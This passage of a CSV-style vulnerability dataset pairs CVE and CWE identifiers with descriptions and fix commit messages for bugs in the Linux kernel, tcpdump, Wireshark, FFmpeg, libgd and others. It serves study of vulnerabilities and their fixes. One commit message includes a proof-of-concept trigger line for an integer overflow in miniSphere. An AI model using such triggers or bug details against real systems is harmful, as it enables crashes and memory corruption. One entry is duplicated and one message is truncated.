<pbonzini@redhat.com>"
CVE-2017-12876,CWE-787,2017-08-28,Heap-based buffer overflow in enhance.c in ImageMagick before 7.0.6-6 allows remote attackers to cause a denial of service via a crafted file.,#655
CVE-2016-5353,CWE-20,2016-08-07,"epan/dissectors/packet-umts_fp.c in the UMTS FP dissector in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles the reserved C/T value, which allows remote attackers to cause a denial of service (application crash) via a crafted packet.","The spec puts the reserved value at 0xf but our internal table has 'unknown' at 0; since all the other values seem to be offset-by-one, just take the modulus 0xf to avoid running off the end of the table.  Bug: 12191 Change-Id: I83c8fb66797bbdee52a2246fb1eea6e37cbc7eb0 Reviewed-on: https://code.wireshark.org/review/15722 Reviewed-by: Evan Huus <eapache@gmail.com> Petri-Dish: Evan Huus <eapache@gmail.com> Tested-by: Petri Dish Buildbot <buildbot-no-reply@wireshark.org> Reviewed-by: Michael Mann <mmann78@netscape.net>"
CVE-2018-16227,CWE-125,2019-10-03,The IEEE 802.11 parser in tcpdump before 4.9.3 has a buffer over-read in print-802_11.c for the Mesh Flags subfield.,ieee802_11_print() tried to access the Mesh Flags subfield of the Mesh Control field to find the size of the latter and increment the expected 802.11 header length before checking it is fully present in the input buffer. Add an intermediate bounds check to make it safe.  This fixes a buffer over-read discovered by Ryan Ackroyd.  Add a test using the capture file supplied by the reporter(s).
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2013-7021,CWE-399,2013-12-09,"The filter_frame function in libavfilter/vf_fps.c in FFmpeg before 2.1 does not properly ensure the availability of FIFO content, which allows remote attackers to cause a denial of service (double free) or possibly have unspecified other impact via crafted data.",
CVE-2016-0798,CWE-399,2016-03-03,"Memory leak in the SRP_VBASE_get_by_user implementation in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory consumption) by providing an invalid username in a connection attempt, related to apps/s_server.c and crypto/srp/srp_vfy.c.",
CVE-2015-8872,CWE-189,2016-06-03,"The set_fat function in fat.c in dosfstools before 4.0 might allow attackers to corrupt a FAT12 filesystem or cause a denial of service (invalid memory read and crash) by writing an odd number of clusters to the third to last entry on a FAT12 filesystem, which triggers an ""off-by-two error.""","In FAT12 two 12 bit entries are combined to a 24 bit value (three bytes). Therefore, when an even numbered FAT entry is set in FAT12, it must be be combined with the following entry. To prevent accessing beyond the end of the FAT array, it must be checked that the cluster is not the last one.  Previously, the check tested that the requested cluster was equal to fs->clusters - 1. However, fs->clusters is the number of data clusters not including the two reserved FAT entries at the start so the test triggered two clusters early.  If the third to last entry was written on a FAT12 filesystem with an odd number of clusters, the second to last entry would be corrupted. This corruption may also lead to invalid memory accesses when the corrupted entry becomes out of bounds and is used later.  Change the test to fs->clusters + 1 to fix.  Reported-by: Hanno Böck Signed-off-by: Andreas Bombe <aeb@debian.org>"
CVE-2015-5697,CWE-200,2015-08-31,"The get_bitmap_file function in drivers/md/md.c in the Linux kernel before 4.1.6 does not initialize a certain bitmap data structure, which allows local users to obtain sensitive information from kernel memory via a GET_BITMAP_FILE ioctl call.","In drivers/md/md.c get_bitmap_file() uses kmalloc() for creating a mdu_bitmap_file_t called ""file"".  5769         file = kmalloc(sizeof(*file), GFP_NOIO); 5770         if (!file) 5771                 return -ENOMEM;  This structure is copied to user space at the end of the function.  5786         if (err == 0 && 5787             copy_to_user(arg, file, sizeof(*file))) 5788                 err = -EFAULT  But if bitmap is disabled only the first byte of ""file"" is initialized with zero, so it's possible to read some bytes (up to 4095) of kernel space memory from user space. This is an information leak.  5775         /* bitmap disabled, zero the first byte and copy out */ 5776         if (!mddev->bitmap_info.file) 5777                 file->pathname[0] = '\0';  Signed-off-by: Benjamin Randazzo <benjamin@randazzo.fr> Signed-off-by: NeilBrown <neilb@suse.com>"
CVE-2017-14341,CWE-400,2017-09-12,"ImageMagick 7.0.6-6 has a large loop vulnerability in ReadWPGImage in coders/wpg.c, causing CPU exhaustion via a crafted wpg image file.",
CVE-2013-2220,CWE-119,2013-07-31,Buffer overflow in the radius_get_vendor_attr function in the Radius extension before 1.2.7 for PHP allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large Vendor Specific Attributes (VSA) length value.,"The underlying rad_get_vendor_attr() function assumed that it would always be given valid VSA data. Indeed, the buffer length wasn't even passed in; the assumption was that the length field within the VSA structure would be valid.  This could result in denial of service by providing a length that would be beyond the memory limit, or potential arbitrary memory access by providing a length greater than the actual data given.  rad_get_vendor_attr() has been changed to require the raw data length be provided, and this is then used to check that the VSA is valid.  Conflicts: 	radlib_vs.h"
CVE-2014-9730,,2015-08-31,"The udf_pc_to_char function in fs/udf/symlink.c in the Linux kernel before 3.18.2 relies on component lengths that are unused, which allows local users to cause a denial of service (system crash) via a crafted UDF filesystem image.",Check that length specified in a component of a symlink fits in the input buffer we are reading. Also properly ignore component length for component types that do not use it. Otherwise we read memory after end of buffer for corrupted udf image.  Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2016-9442,CWE-119,2016-12-12,An issue was discovered in the Tatsuya Kinoshita w3m fork before 0.5.3-31. w3m allows remote attackers to cause memory corruption in certain conditions via a crafted HTML page.,Fix potential heap buffer corruption due to Strgrow
CVE-2012-0038,CWE-190,2012-05-17,"Integer overflow in the xfs_acl_from_disk function in fs/xfs/xfs_acl.c in the Linux kernel before 3.1.9 allows local users to cause a denial of service (panic) via a filesystem with a malformed ACL, leading to a heap-based buffer overflow.","Commit fa8b18e didn't prevent the integer overflow and possible memory corruption.  ""count"" can go negative and bypass the check.  Signed-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Signed-off-by: Ben Myers <bpm@sgi.com>"
CVE-2012-2673,CWE-189,2012-07-25,"Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.","* malloc.c: Include limits.h for SIZE_MAX. * malloc.c (SIZE_MAX, calloc): Define GC_SIZE_MAX instead of SIZE_MAX."
CVE-2014-5353,CWE-476,2014-12-16,"The krb5_ldap_get_password_policy_from_dn function in plugins/kdb/ldap/libkdb_ldap/ldap_pwd_policy.c in MIT Kerberos 5 (aka krb5) before 1.13.1, when the KDC uses LDAP, allows remote authenticated users to cause a denial of service (daemon crash) via a successful LDAP query with no results, as demonstrated by using an incorrect object type for a password policy.","In krb5_ldap_get_password_policy_from_dn, if LDAP_SEARCH returns successfully with no results, return KRB5_KDB_NOENTRY instead of returning success with a zeroed-out policy object.  This fixes a null dereference when an admin attempts to use an LDAP ticket policy name as a password policy name.  CVE-2014-5353:  In MIT krb5, when kadmind is configured to use LDAP for the KDC database, an authenticated remote attacker can cause a NULL dereference by attempting to use a named ticket policy object as a password policy for a principal.  The attacker needs to be authenticated as a user who has the elevated privilege for setting password policy by adding or modifying principals.  Queries to LDAP scoped to the krbPwdPolicy object class will correctly not return entries of other classes, such as ticket policy objects, but may return success with no returned elements if an object with the requested DN exists in a different object class.  In this case, the routine to retrieve a password policy returned success with a password policy object that consisted entirely of zeroed memory.  In particular, accesses to the policy name will dereference a NULL pointer.  KDC operation does not access the policy name field, but most kadmin operations involving the principal with incorrect password policy will trigger the crash.  Thanks to Patrik Kis for reporting this problem.  CVSSv2 Vector: AV:N/AC:M/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:C  [kaduk@mit.edu: CVE description and CVSS score]  ticket: 8051 (new) target_version: 1.13.1 tags: pullup"
CVE-2019-5489,CWE-319,2019-01-07,"The mincore() implementation in mm/mincore.c in the Linux kernel through 4.19.13 allowed local attackers to observe page cache access patterns of other processes on the same system, potentially allowing sniffing of secret information. (Fixing this affects the output of the fincore program.) Limited remote exploitation may be possible, as demonstrated by latency differences in accessing public files from an Apache HTTP Server.","The semantics of what ""in core"" means for the mincore() system call are somewhat unclear, but Linux has always (since 2.3.52, which is when mincore() was initially done) treated it as ""page is available in page cache"" rather than ""page is mapped in the mapping"".  The problem with that traditional semantic is that it exposes a lot of system cache state that it really probably shouldn't, and that users shouldn't really even care about.  So let's try to avoid that information leak by simply changing the semantics to be that mincore() counts actual mapped pages, not pages that might be cheaply mapped if they were faulted (note the ""might be"" part of the old semantics: being in the cache doesn't actually guarantee that you can access them without IO anyway, since things like network filesystems may have to revalidate the cache before use).  In many ways the old semantics were somewhat insane even aside from the information leak issue.  From the very beginning (and that beginning is a long time ago: 2.3.52 was released in March 2000, I think), the code had a comment saying    Later we can get more picky about what ""in core"" means precisely.  and this is that ""later"".  Admittedly it is much later than is really comfortable.  NOTE! This is a real semantic change, and it is for example known to change the output of ""fincore"", since that program literally does a mmmap without populating it, and then doing ""mincore()"" on that mapping that doesn't actually have any pages in it.  I'm hoping that nobody actually has any workflow that cares, and the info leak is real.  We may have to do something different if it turns out that people have valid reasons to want the old semantics, and if we can limit the information leak sanely.  Cc: Kevin Easton <kevin@guarana.org> Cc: Jiri Kosina <jikos@kernel.org> Cc: Masatake YAMATO <yamato@redhat.com> Cc: Andrew Morton <akpm@linux-foundation.org> Cc: Greg KH <gregkh@linuxfoundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Michal Hocko <mhocko@suse.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2013-3236,CWE-200,2013-04-22,"The vmci_transport_dgram_dequeue function in net/vmw_vsock/vmci_transport.c in the Linux kernel before 3.9-rc7 does not properly initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","In case we received no data on the call to skb_recv_datagram(), i.e. skb->data is NULL, vmci_transport_dgram_dequeue() will return with 0 without updating msg_namelen leading to net/socket.c leaking the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.  Fix this by moving the already existing msg_namelen assignment a few lines above.  Cc: Andy King <acking@vmware.com> Cc: Dmitry Torokhov <dtor@vmware.com> Cc: George Zhang <georgezhang@vmware.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-13053,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:decode_rt_routing_info().,"decode_rt_routing_info() didn't check bounds before fetching 4 octets of the origin AS field and could over-read the input buffer, put it right.  It also fetched the varying number of octets of the route target field from 4 octets lower than the correct offset, put it right.  It also used the same temporary buffer explicitly through as_printf() and implicitly through bgp_vpn_rd_print() so the end result of snprintf() was not what was originally intended.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-13690,CWE-125,2017-09-14,"The IKEv2 parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c, several functions.","Use a pointer of the correct type in ND_TCHECK(), or use ND_TCHECK2() and provide the correct length.  While we're at it, remove the blank line between some checks and the UNALIGNED_MEMCPY()s they protect.  Also, note the places where we print the entire payload.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-13688,CWE-125,2017-09-14,The OLSR parser in tcpdump before 4.9.2 has a buffer over-read in print-olsr.c:olsr_print().,"While we're at it, clean up some other bounds checks, so we check that we have a complete IPv4 message header if it's IPv4 and a complete IPv6 message header if it's IPv6.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add tests using the capture files supplied by the reporter(s)."
CVE-2015-7885,CWE-200,2015-12-28,"The dgnc_mgmt_ioctl function in drivers/staging/dgnc/dgnc_mgmt.c in the Linux kernel through 4.3.3 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel memory via a crafted application.",The dgnc_mgmt_ioctl() code fails to initialize the 16 _reserved bytes of struct digi_dinfo after the ->dinfo_nboards member. Add an explicit memset(0) before filling the structure to avoid the info leak.  Signed-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2016-3156,CWE-399,2016-04-27,"The IPv4 implementation in the Linux kernel before 4.5.2 mishandles destruction of device objects, which allows guest OS users to cause a denial of service (host OS networking outage) by arranging for a large number of IP addresses.","When an inetdev is destroyed, every address assigned to the interface is removed.  And in this scenerio we do two pointless things which can be very expensive if the number of assigned interfaces is large:  1) Address promotion.  We are deleting all addresses, so there is no    point in doing this.  2) A full nf conntrack table purge for every address.  We only need to    do this once, as is already caught by the existing    masq_dev_notifier so masq_inet_event() can skip this.  Reported-by: Solar Designer <solar@openwall.com> Signed-off-by: David S. Miller <davem@davemloft.net> Tested-by: Cyrill Gorcunov <gorcunov@openvz.org>"
CVE-2015-8970,CWE-476,2016-11-28,"crypto/algif_skcipher.c in the Linux kernel before 4.4.2 does not verify that a setkey operation has been performed on an AF_ALG socket before an accept system call is processed, which allows local users to cause a denial of service (NULL pointer dereference and system crash) via a crafted application that does not supply a key, related to the lrw_crypt function in crypto/lrw.c.",Some cipher implementations will crash if you try to use them without calling setkey first.  This patch adds a check so that the accept(2) call will fail with -ENOKEY if setkey hasn't been done on the socket yet.  Cc: stable@vger.kernel.org Reported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Tested-by: Dmitry Vyukov <dvyukov@google.com>
CVE-2016-7414,CWE-119,2016-09-17,"The ZIP signature-verification feature in PHP before 5.6.26 and 7.x before 7.0.11 does not ensure that the uncompressed_filesize field is large enough, which allows remote attackers to cause a denial of service (out-of-bounds memory access) or possibly have unspecified other impact via a crafted PHAR archive, related to ext/phar/util.c and ext/phar/zip.c.",(cherry picked from commit 19484ab)
CVE-2015-1344,CWE-264,2015-12-07,"The do_write_pids function in lxcfs.c in LXCFS before 0.12 does not properly check permissions, which allows local users to gain privileges by writing a pid to the tasks file.","When writing pids to a tasks file in lxcfs, lxcfs was checking for privilege over the tasks file but not over the pid being moved.  Since the cgm_movepid request is done as root on the host, not with the requestor's credentials, we must copy the check which cgmanager was doing to ensure that the requesting task is allowed to change the victim task's cgroup membership.  This is CVE-2015-1344 https://bugs.launchpad.net/ubuntu/+source/lxcfs/+bug/1512854  Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>"
CVE-2012-6689,CWE-284,2016-05-02,"The netlink_sendmsg function in net/netlink/af_netlink.c in the Linux kernel before 3.5.5 does not validate the dst_pid field, which allows local users to have an unspecified impact by spoofing Netlink messages.","Non-root user-space processes can send Netlink messages to other processes that are well-known for being subscribed to Netlink asynchronous notifications. This allows ilegitimate non-root process to send forged messages to Netlink subscribers.  The userspace process usually verifies the legitimate origin in two ways:  a) Socket credentials. If UID != 0, then the message comes from    some ilegitimate process and the message needs to be dropped.  b) Netlink portID. In general, portID == 0 means that the origin    of the messages comes from the kernel. Thus, discarding any    message not coming from the kernel.  However, ctnetlink sets the portID in event messages that has been triggered by some user-space process, eg. conntrack utility. So other processes subscribed to ctnetlink events, eg. conntrackd, know that the event was triggered by some user-space action.  Neither of the two ways to discard ilegitimate messages coming from non-root processes can help for ctnetlink.  This patch adds capability validation in case that dst_pid is set in netlink_sendmsg(). This approach is aggressive since existing applications using any Netlink bus to deliver messages between two user-space processes will break. Note that the exception is NETLINK_USERSOCK, since it is reserved for netlink-to-netlink userspace communication.  Still, if anyone wants that his Netlink bus allows netlink-to-netlink userspace, then they can set NL_NONROOT_SEND. However, by default, I don't think it makes sense to allow to use NETLINK_ROUTE to communicate two processes that are sending no matter what information that is not related to link/neighbouring/routing. They should be using NETLINK_USERSOCK instead for that.  Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-2383,CWE-189,2012-06-13,Integer overflow in the i915_gem_execbuffer2 function in drivers/gpu/drm/i915/i915_gem_execbuffer.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.3.5 on 32-bit platforms allows local users to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted ioctl call.,"On 32-bit systems, a large args->buffer_count from userspace via ioctl may overflow the allocation size, leading to out-of-bounds access.  This vulnerability was introduced in commit 8408c28 (""drm/i915: First try a normal large kmalloc for the temporary exec buffers"").  Signed-off-by: Xi Wang <xi.wang@gmail.com> Reviewed-by: Chris Wilson <chris@chris-wilson.co.uk> Cc: stable@vger.kernel.org Signed-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>"
CVE-2018-12459,CWE-20,2018-06-15,"An inconsistent bits-per-sample value in the ff_mpeg4_decode_picture_header function in libavcodec/mpeg4videodec.c in FFmpeg 4.0 may trigger an assertion violation while converting a crafted AVI file to MPEG4, leading to a denial of service.","Fixes: assertion failure Fixes: ffmpeg_crash_5.avi  Found-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2018-1000524,CWE-190,2018-06-26,"miniSphere version 5.2.9 and earlier contains a Integer Overflow vulnerability in layer_resize() function in map_engine.c that can result in remote denial of service. This attack appear to be exploitable via the victim must load a specially-crafted map which calls SetLayerSize in its entry script. This vulnerability appears to have been fixed in 5.0.3, 5.1.5, 5.2.10 and later.","* Fix integer overflow in layer_resize in map_engine.c  There's a buffer overflow bug in the function layer_resize. It allocates a buffer `tilemap` with size `x_size * y_size * sizeof(struct map_tile)`. But it didn't check for integer overflow, so if x_size and y_size are very large, it's possible that the buffer size is smaller than needed, causing a buffer overflow later.  PoC: `SetLayerSize(0, 0x7FFFFFFF, 0x7FFFFFFF);`  * move malloc to a separate line"
CVE-2016-5356,CWE-119,2016-08-07,"wiretap/cosine.c in the CoSine file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","The scanf family of functions are as annoyingly bad at handling unsigned numbers as strtoul() is - both of them are perfectly willing to accept a value beginning with a negative sign as an unsigned value.  When using strtoul(), you can compensate for this by explicitly checking for a '-' as the first character of the string, but you can't do that with sscanf().  So revert to having pkt_len be signed, and scanning it with %d, but check for a negative value and fail if we see a negative value.  Bug: 12395 Change-Id: I43b458a73b0934e9a5c2c89d34eac5a8f21a7455 Reviewed-on: https://code.wireshark.org/review/15223 Reviewed-by: Guy Harris <guy@alum.mit.edu>"
CVE-2013-2220,CWE-119,2013-07-31,Buffer overflow in the radius_get_vendor_attr function in the Radius extension before 1.2.7 for PHP allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large Vendor Specific Attributes (VSA) length value.,"The underlying rad_get_vendor_attr() function assumed that it would always be given valid VSA data. Indeed, the buffer length wasn't even passed in; the assumption was that the length field within the VSA structure would be valid.  This could result in denial of service by providing a length that would be beyond the memory limit, or potential arbitrary memory access by providing a length greater than the actual data given.  rad_get_vendor_attr() has been changed to require the raw data length be provided, and this is then used to check that the VSA is valid.  Conflicts: 	radlib_vs.h"
CVE-2010-1635,,2010-06-17,The chain_reply function in process.c in smbd in Samba before 3.4.8 and 3.5.x before 3.5.2 allows remote attackers to cause a denial of service (NULL pointer dereference and process crash) via a Negotiate Protocol request with a certain 0x0003 field value followed by a Session Setup AndX request with a certain 0x8003 field value.,
CVE-2016-6214,CWE-125,2016-08-12,gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.3 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA file.,"Currently, only 24bpp without alphabits and 32bpp with 8 alphabits are really supported. All other combinations will be rejected with a warning."
CVE-2014-3122,CWE-400,2014-05-11,"The try_to_unmap_cluster function in mm/rmap.c in the Linux kernel before 3.14.3 does not properly consider which pages must be locked, which allows local users to cause a denial of service (system crash) by triggering a memory-usage pattern that requires removal of page-table mappings.","A BUG_ON(!PageLocked) was triggered in mlock_vma_page() by Sasha Levin fuzzing with trinity.  The call site try_to_unmap_cluster() does not lock the pages other than its check_page parameter (which is already locked).  The BUG_ON in mlock_vma_page() is not documented and its purpose is somewhat unclear, but apparently it serializes against page migration, which could otherwise fail to transfer the PG_mlocked flag.  This would not be fatal, as the page would be eventually encountered again, but NR_MLOCK accounting would become distorted nevertheless.  This patch adds a comment to the BUG_ON in mlock_vma_page() and munlock_vma_page() to that effect.  The call site try_to_unmap_cluster() is fixed so that for page != check_page, trylock_page() is attempted (to avoid possible deadlocks as we already have check_page locked) and mlock_vma_page() is performed only upon success.  If the page lock cannot be obtained, the page is left without PG_mlocked, which is again not a problem in the whole unevictable memory design.  Signed-off-by: Vlastimil Babka <vbabka@suse.cz> Signed-off-by: Bob Liu <bob.liu@oracle.com> Reported-by: Sasha Levin <sasha.levin@oracle.com> Cc: Wanpeng Li <liwanp@linux.vnet.ibm.com> Cc: Michel Lespinasse <walken@google.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Acked-by: Rik van Riel <riel@redhat.com> Cc: David Rientjes <rientjes@google.com> Cc: Mel Gorman <mgorman@suse.de> Cc: Hugh Dickins <hughd@google.com> Cc: Joonsoo Kim <iamjoonsoo.kim@lge.com> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-3647,,2014-11-10,"arch/x86/kvm/emulate.c in the KVM subsystem in the Linux kernel through 3.17.2 does not properly perform RIP changes, which allows guest OS users to cause a denial of service (guest OS crash) via a crafted application.","Far jmp/call/ret may fault while loading a new RIP.  Currently KVM does not handle this case, and may result in failed vm-entry once the assignment is done.  The tricky part of doing so is that loading the new CS affects the VMCS/VMCB state, so if we fail during loading the new RIP, we are left in unconsistent state.  Therefore, this patch saves on 64-bit the old CS descriptor and restores it if loading RIP failed.  This fixes CVE-2014-3647.  Cc: stable@vger.kernel.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-2206,,2013-07-04,"The sctp_sf_do_5_2_4_dupcook function in net/sctp/sm_statefuns.c in the SCTP implementation in the Linux kernel before 3.8.5 does not properly handle associations during the processing of a duplicate COOKIE ECHO chunk, which allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via crafted SCTP traffic.","When SCTP is done processing a duplicate cookie chunk, it tries to delete a newly created association.  For that, it has to set the right association for the side-effect processing to work. However, when it uses the SCTP_CMD_NEW_ASOC command, that performs more work then really needed (like hashing the associationa and assigning it an id) and there is no point to do that only to delete the association as a next step.  In fact, it also creates an impossible condition where an association may be found by the getsockopt() call, and that association is empty.  This causes a crash in some sctp getsockopts.  The solution is rather simple.  We simply use SCTP_CMD_SET_ASOC command that doesn't have all the overhead and does exactly what we need.  Reported-by: Karl Heiss <kheiss@gmail.com> Tested-by: Karl Heiss <kheiss@gmail.com> CC: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-6906,CWE-125,2017-03-15,"The read_image_tga function in gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA file, related to the decompression buffer.","It is possible to craft TGA files which will overflow the decompression buffer, but not the image's bitmap. Therefore we augment the check for the bitmap's overflow with a check for the buffer's overflow.  This issue had been reported by Ibrahim El-Sayed to security@libgd.org.  CVE-2016-6906"
CVE-2015-1331,CWE-59,2015-08-12,lxclock.c in LXC 1.1.2 and earlier allows local users to create arbitrary files via a symlink attack on /run/lock/lxc/*.,This prevents an unprivileged user to use LXC to create arbitrary file on the filesystem.  Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com> Signed-off-by: Tyler Hicks <tyhicks@canonical.com> Acked-by: Stéphane Graber <stgraber@ubuntu.com>
CVE-2017-9992,CWE-119,2017-06-28,"Heap-based buffer overflow in the decode_dds1 function in libavcodec/dfa.c in FFmpeg before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted file.",Fixes out of array access Fixes: 1345/clusterfuzz-testcase-minimized-6062963045695488  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-20854,CWE-125,2019-07-26,An issue was discovered in the Linux kernel before 4.20. drivers/phy/mscc/phy-ocelot-serdes.c has an off-by-one error with a resultant ctrl->phys out-of-bounds read.,"Currently, there is an out-of-bounds read on array ctrl->phys, once variable i reaches the maximum array size of SERDES_MAX in the for loop.  Fix this by changing the condition in the for loop from i <= SERDES_MAX to i < SERDES_MAX.  Addresses-Coverity-ID: 1473966 (""Out-of-bounds read"") Addresses-Coverity-ID: 1473959 (""Out-of-bounds read"") Fixes: 51f6b41 (""phy: add driver for Microsemi Ocelot SerDes muxing"") Reviewed-by: Quentin Schulz <quentin.schulz@bootlin.com> Signed-off-by: Gustavo A. R. Silva <gustavo@embeddedor.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-2847,CWE-399,2016-04-27,"fs/pipe.c in the Linux kernel before 4.5 does not limit the amount of unread data in pipes, which allows local users to cause a denial of service (memory consumption) by creating many pipes with non-default sizes.","On no-so-small systems, it is possible for a single process to cause an OOM condition by filling large pipes with data that are never read. A typical process filling 4000 pipes with 1 MB of data will use 4 GB of memory. On small systems it may be tricky to set the pipe max size to prevent this from happening.  This patch makes it possible to enforce a per-user soft limit above which new pipes will be limited to a single page, effectively limiting them to 4 kB each, as well as a hard limit above which no new pipes may be created for this user. This has the effect of protecting the system against memory abuse without hurting other users, and still allowing pipes to work correctly though with less data at once.  The limit are controlled by two new sysctls : pipe-user-pages-soft, and pipe-user-pages-hard. Both may be disabled by setting them to zero. The default soft limit allows the default number of FDs per process (1024) to create pipes of the default size (64kB), thus reaching a limit of 64MB before starting to create only smaller pipes. With 256 processes limited to 1024 FDs each, this results in 1024*64kB + (256*1024 - 1024) * 4kB = 1084 MB of memory allocated for a user. The hard limit is disabled by default to avoid breaking existing applications that make intensive use of pipes (eg: for splicing).  Reported-by: socketpair@gmail.com Reported-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp> Mitigates: CVE-2013-4312 (Linux 2.0+) Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Willy Tarreau <w@1wt.eu> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2014-3511,,2014-08-13,"The ssl23_get_client_hello function in s23_srvr.c in OpenSSL 1.0.1 before 1.0.1i allows man-in-the-middle attackers to force the use of TLS 1.0 by triggering ClientHello message fragmentation in communication between a client and server that both support later TLS versions, related to a ""protocol downgrade"" issue.",
CVE-2015-8865,CWE-119,2016-05-20,"The file_check_mem function in funcs.c in file before 5.23, as used in the Fileinfo component in PHP before 5.5.34, 5.6.x before 5.6.20, and 7.x before 7.0.5, mishandles continuation-level jumps, which allows context-dependent attackers to cause a denial of service (buffer overflow and application crash) or possibly execute arbitrary code via a crafted magic file.",20 in a single step.
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-9077,,2017-05-19,"The tcp_v6_syn_recv_sock function in net/ipv6/tcp_ipv6.c in the Linux kernel through 4.11.1 mishandles inheritance, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls, a related issue to CVE-2017-8890.","Like commit 657831f (""dccp/tcp: do not inherit mc_list from parent"") we should clear ipv6_mc_list etc. for IPv6 sockets too.  Cc: Eric Dumazet <edumazet@google.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
